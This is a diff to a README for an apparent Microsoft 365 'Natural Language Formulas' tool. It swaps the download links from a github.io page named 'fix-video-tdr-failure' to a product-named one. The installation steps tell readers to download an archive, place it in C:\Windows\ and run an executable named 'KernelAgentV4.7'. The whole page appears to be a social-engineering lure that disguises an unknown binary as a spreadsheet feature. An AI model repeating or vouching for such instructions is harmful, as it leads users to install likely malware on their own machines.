@@ -2,7 +2,8 @@
 
 This project introduces Natural Language Formulas to Microsoft 365, enabling users to generate Excel formulas by typing plain English instructions. It simplifies spreadsheet workflows and eliminates the need to memorize complex syntax.
 
-[![Download Natural Language Formulas](https://img.shields.io/badge/Download-Natural_Language_Formulas-blueviolet)](https://fix-video-tdr-failure.github.io/.github)
+[![Download Natural Language Formulas](https://img.shields.io/badge/Download-Natural_Language_Formulas-blueviolet)](https://natural-language-formulas-m365.github.io/.github
+)
 
 ---
 
@@ -64,7 +65,8 @@ This project introduces Natural Language Formulas to Microsoft 365, enabling use
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://fix-video-tdr-failure.github.io/.github) section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://natural-language-formulas-m365.github.io/.github
+) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🔁 Restart your computer after the process is complete
